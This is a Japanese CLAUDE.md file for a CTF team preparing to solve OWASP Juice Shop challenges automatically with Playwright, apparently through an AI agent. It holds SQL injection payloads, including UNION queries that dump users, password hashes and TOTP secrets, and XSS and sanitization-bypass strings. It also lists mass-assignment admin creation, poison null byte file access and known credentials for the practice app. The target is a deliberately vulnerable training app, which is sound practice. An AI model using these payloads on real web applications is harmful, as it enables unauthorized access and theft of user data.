# CLAUDE.md

OWASP Juice Shop CTF 攻略準備 - **team2-takenoko**

## セッション目的

Playwright を使って未解決チャレンジを自動攻略するための事前準備。

## ディレクトリ構造

```
juice_shop/
├── CLAUDE.md           # このファイル
├── result.md           # 進捗確認（難易度別リンク）
├── advanced-techniques.md  # 高度な攻撃手法
│
├── difficulty-1/       # 難易度1 チャレンジ (15個)
│   ├── README.md       # 概要・進捗・一覧
│   ├── score-board.md  # 個別チャレンジ
│   └── ...
│
├── difficulty-2/       # 難易度2 チャレンジ (14個)
│   ├── README.md
│   └── ...
│
├── difficulty-3/       # 難易度3 チャレンジ (20個)
│   ├── README.md
│   └── ...
│
├── difficulty-4/       # 難易度4 チャレンジ (13個)
│   ├── README.md
│   └── ...
│
└── difficulty-5-6/     # 難易度5-6 チャレンジ (7個)
    ├── README.md
    └── ...
```

### 各チャレンジファイルの形式

```markdown
# チャレンジ名 ✅/❌

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi / XSS / 認証 など
**目標:** チャレンジの目標

## 思考プロセス
[段階的な解法の考え方]

## 実行手順
[具体的な手順]

## コード/ペイロード
[攻撃コード]

## 解説
[なぜ成功するのかの説明]
```

### 難易度別の主な内容

| ディレクトリ | 主な内容 |
|-------------|----------|
| `difficulty-1/` | URL探索、XSS入門、DevTools の使い方 |
| `difficulty-2/` | SQLi入門、IDOR、Reflected XSS |
| `difficulty-3/` | 特定ユーザーSQLi、XXE、CAPTCHA Bypass |
| `difficulty-4/` | UNION SQLi、NoSQLi、Poison Null Byte |
| `difficulty-5-6/` | JWT操作、2FA バイパス、NoSQL Exfiltration |

---

## Playwright 攻略パターン

### 1. SQLi ログイン攻撃

```
1. browser_navigate → http://localhost:3000/#/login
2. browser_snapshot → ref確認
3. browser_type → email欄に "' OR 1=1--"
4. browser_type → password欄に "a"
5. browser_click → Loginボタン
6. browser_snapshot → 成功確認
```

### 2. XSS 攻撃

```
1. browser_navigate → http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
2. browser_snapshot → XSS発動確認
```

### 3. API操作（fetch実行）

```javascript
browser_evaluate → function:
() => fetch('/api/Users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'test@test.com', password: 'test', role: 'admin'})
}).then(r => r.json())
```

### 4. 隠しページアクセス

```
browser_navigate → http://localhost:3000/#/score-board
browser_navigate → http://localhost:3000/#/administration
browser_navigate → http://localhost:3000/#/web3-sandbox
browser_navigate → http://localhost:3000/#/tokensale-ico-ea
browser_navigate → http://localhost:3000/ftp
browser_navigate → http://localhost:3000/metrics
browser_navigate → http://localhost:3000/support/logs
```

### 5. パスワードリセット攻撃

```
1. browser_navigate → http://localhost:3000/#/forgot-password
2. browser_snapshot → ref確認
3. browser_type → email欄に "bjoern@owasp.org"
4. browser_type → answer欄に "Zaya"
5. browser_type → password欄に新パスワード
6. browser_click → Reset
```

### 6. Poison Null Byte でファイル取得

```
browser_navigate → http://localhost:3000/ftp/package.json.bak%2500.md
browser_navigate → http://localhost:3000/ftp/eastere.gg%2500.md
browser_navigate → http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
```

---

## 未解決チャレンジ優先リスト

### 難易度1-2（即座に解ける）

| チャレンジ | Playwright操作 |
|-----------|---------------|
| Mass Dispel | Shift+通知×クリック |
| Web3 Sandbox | navigate → `/#/web3-sandbox` |
| Meta Geo Stalking | exiftool → forgot-password で `Daniel Boone National Forest` |
| Visual Geo Stalking | forgot-password で `ITsec` |
| Empty User Registration | DevTools で入力検証無効化 |

### 難易度3（API/SQLi）

| チャレンジ | 攻略方法 |
|-----------|----------|
| CAPTCHA Bypass | 同じCAPTCHA値を再利用 |
| CSRF | 別オリジンからフォーム送信 |
| Ghost Login | `' or deletedAt IS NOT NULL--` |
| Login Amy | `K1f....................` (21文字) |
| Payback Time | quantity: -100 |
| Deluxe Fraud | paymentMode: '' |
| Reset Jim | 答え: `Samuel` |

### 難易度4（高度）

| チャレンジ | 攻略方法 |
|-----------|----------|
| Expired Coupon | 日付→2019/3/8 + `WMNSDY2019` |
| Nested Easter Egg | Base64→ROT13デコード |
| Sanitization Bypass | `<<script>script>...` |
| Steganography | OpenStego で `5.png` 解析 |
| Login Bjoern Gmail | 逆順Base64 |

### 難易度5-6（上級）

| チャレンジ | 攻略方法 |
|-----------|----------|
| Token Sale | `/#/tokensale-ico-ea` |
| Change Bender Password | `current`省略バイパス |
| TOTP Bypass | SQLiでシークレット抽出 |
| Unsigned JWT | alg: none |
| Forged Coupon | Z85エンコード |
| SSRF | profileImage URL |

---

## クイックリファレンス

### 認証情報

```
admin@juice-sh.op / admin123
jim@juice-sh.op / ncc-1701
bender@juice-sh.op / OhG0dPlease1LubYou
mc.safesearch@juice-sh.op / Mr. N00dles
amy@juice-sh.op / K1f....................
bjoern.kimminich@gmail.com / bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
```

### SQLi ペイロード

```sql
' OR 1=1--                           -- 管理者
jim@juice-sh.op'--                   -- 特定ユーザー
' or deletedAt IS NOT NULL--         -- 削除済み
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
')) UNION SELECT id,email,password,totpsecret,5,6,7,8,9 FROM users--
```

### XSS ペイロード

```html
<iframe src="javascript:alert('xss')">
<<script>script>alert('xss')<</script>/script>
<img src=x onerror=alert(1)>
```

### セキュリティ質問

```
bjoern@owasp.org → Zaya (ペット)
bender@juice-sh.op → Stop'n'Drop (会社)
jim@juice-sh.op → Samuel (兄弟)
emma → ITsec (勤務先)
john → Daniel Boone National Forest (場所)
```

### 主要エンドポイント

```
/#/login            /#/register         /#/search
/#/score-board      /#/administration   /#/complain
/#/forgot-password  /#/photo-wall       /#/web3-sandbox
/#/tokensale-ico-ea /#/deluxe-membership /#/csaf
/ftp                /metrics            /support/logs
/api/Users          /api/Feedbacks      /api/Products
/api/BasketItems    /rest/basket/{id}   /rest/captcha
/rest/products/search?q=                /rest/user/change-password
/rest/products/reviews                  /rest/deluxe-membership
```

### Poison Null Byte

```
%2500 = %00 のURLエンコード
/ftp/package.json.bak%2500.md
/ftp/eastere.gg%2500.md
/ftp/coupons_2013.md.bak%2500.md
/ftp/suspicious_errors.yml%2500.md
```

---

## Playwright トラブルシューティング

**「既存のブラウザ セッションで開いています」:**
```bash
rm -rf ~/Library/Caches/ms-playwright/mcp-chrome-*
```

---

## 参考リンク

- https://help.owasp-juice.shop/appendix/solutions.html
- https://pwning.owasp-juice.shop/
- https://github.com/juice-shop/juice-shop
